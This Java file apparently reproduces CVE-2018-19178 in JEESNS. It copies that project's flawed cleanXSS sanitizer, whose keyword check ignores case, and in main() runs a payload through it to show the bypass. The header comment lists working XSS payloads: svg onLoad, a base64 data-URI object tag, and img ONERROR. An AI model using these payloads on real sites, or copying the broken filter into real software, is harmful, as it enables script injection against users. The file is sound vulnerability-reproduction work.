package CVE;

/**
 * 地方：src/main/java/com.lxinet.jeesns/core/utils/XssHttpServletRequestWrapper.java
 * <svg/onLoad=confirm(1)>
 * <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
 * <img src="x" ONERROR=confirm(0)>
 */

public class CVE_2018_19178 {
    public static void main(String[] args) {
        String xss = "<svg/onLoad=confirm(1)>";
        xss= cleanXSS(xss);//就只需要如果就欧克
        System.out.println(xss);

    }

    private static String cleanXSS(String value) {
        //first checkpoint
        //(?i)忽略大小写
        value = value.replaceAll("(?i)<style>", "&lt;style&gt;").replaceAll("(?i)</style>", "&lt;&#47;style&gt;");
        value = value.replaceAll("(?i)<script>", "&lt;script&gt;").replaceAll("(?i)</script>", "&lt;&#47;script&gt;");
        value = value.replaceAll("(?i)<script", "&lt;script");
        value = value.replaceAll("(?i)eval\\((.*)\\)", "");
        value = value.replaceAll("[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']", "\"\"");

        //second checkpoint
        // 需要过滤的脚本事件关键字
        String[] eventKeywords = { "onmouseover", "onmouseout", "onmousedown",
                "onmouseup", "onmousemove", "onclick", "ondblclick",
                "onkeypress", "onkeydown", "onkeyup", "ondragstart",
                "onerrorupdate", "onhelp", "onreadystatechange", "onrowenter",
                "onrowexit", "onselectstart", "onload", "onunload",
                "onbeforeunload", "onblur", "onerror", "onfocus", "onresize",
                "onscroll", "oncontextmenu", "alert" };
        // 滤除脚本事件代码
        for (int i = 0; i < eventKeywords.length; i++) {//没有处理大写字符
            // 添加一个"_", 使事件代码无效
            value = value.replaceAll(eventKeywords[i],"_" + eventKeywords[i]);
        }
        return value;
    }
}
